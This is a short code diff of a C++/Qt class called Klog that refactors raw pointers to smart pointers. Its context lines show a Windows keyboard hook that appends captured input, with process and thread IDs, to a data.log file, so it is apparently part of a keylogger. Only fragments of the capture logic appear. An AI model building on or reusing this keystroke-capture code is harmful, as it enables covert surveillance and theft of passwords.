@@ -19,7 +19,7 @@ void Klog::setPath(const QString &newPath)
 {
     //Create log file
     path = newPath;
-    logFile = new QFile(path + "/data.log");
+    logFile = std::make_unique<QFile>(path + "/data.log");
 }
 
 Klog::Klog(QObject *parent) :
@@ -27,8 +27,8 @@ Klog::Klog(QObject *parent) :
     isWorking(true),
     currProcess()
 {
-    timer = new QTimer(this);
-    connect(timer, &QTimer::timeout, this, &Klog::timerIsUp);
+    timer = std::make_unique<QTimer>(this);
+    connect(timer.get(), &QTimer::timeout, this, &Klog::timerIsUp);
 
     HINSTANCE hInstance = GetModuleHandle(NULL);
 
@@ -54,7 +54,7 @@ LRESULT CALLBACK Klog::keyboardHookProc(int nCode, WPARAM wParam, LPARAM lParam)
             if ( ! Klog::instance().logFile->open(QIODevice::Append | QIODevice::Text) )
                 qDebug () << "Cannot create log file";
 
-            QTextStream log(Klog::instance().logFile);
+            QTextStream log(Klog::instance().logFile.get());
 
             //Get process ID and thread ID
             DWORD processId;
